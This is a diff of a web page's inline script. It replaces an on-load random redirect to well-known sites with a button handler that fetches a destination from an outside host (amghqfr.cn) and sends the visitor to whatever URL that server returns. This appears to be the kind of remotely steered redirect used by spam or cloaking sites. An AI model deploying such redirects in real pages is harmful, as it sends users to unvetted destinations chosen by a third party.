@@ -1,33 +1,28 @@
     <script>
-			       // 假设你有一个域名列表  
-			const domainList = [  
-				                'https://www.google.com',
-				                'http://www.youtube.com',
-				                'https://www.bing.com',
-				                'https://www.pinterest.com',
-				                'https://photos.google.com',
-				                'http://cn.nytimes.com',
-				                'http://mingpao.com',
-				                'http://udn.com',
-				                'http://www.aolnews.com'
-			    // ... 添加更多域名  
-			];  
-			  
-			// 编写一个函数来随机选择一个域名并跳转  
-			function randomRedirect() {  
-			    // 获取域名列表的长度  
-			    const length = domainList.length;  
-			      
-			    // 生成一个随机索引  
-			    const randomIndex = Math.floor(Math.random() * length);  
-			      
-			    // 获取随机索引对应的域名  
-			    const randomDomain = domainList[randomIndex];  
-			      
-			    // 重定向到该域名  
-			    window.location.href = randomDomain;  
-			}  
-			  
-			// 调用函数以触发随机跳转  
-			randomRedirect();
+		const someURLToRedirectTo = 'https://amghqfr.cn/api/jumpSite?siteName=liuyiling88';  
+		  
+		async function redirectBasedOnResponse() {  
+		  try {  
+		    // 发起GET请求  
+		    const response = await fetch(someURLToRedirectTo, { method: "GET" });  
+		      
+		    // 检查响应是否成功  
+		    if (!response.ok) {  
+		      throw new Error('Failed to fetch the redirect URL: ' + response.statusText);  
+		    }  
+		      
+		    // 解析响应为JSON  
+		    const result = await response.json();  
+		      
+		    // 使用结果中的URL进行重定向  
+		    window.location.href = result.data.siteUrl;  
+		  } catch (error) {  
+		    // 处理错误，例如显示错误信息  
+		    console.error('Error:', error);  
+		    // 你可以在这里添加额外的错误处理逻辑，如显示一个错误消息给用户  
+		  }  
+		}  
+		  
+		// 假设你有一个按钮，当用户点击它时，执行重定向逻辑  
+		document.getElementById('redirectButton').addEventListener('click', redirectBasedOnResponse);
     </script>
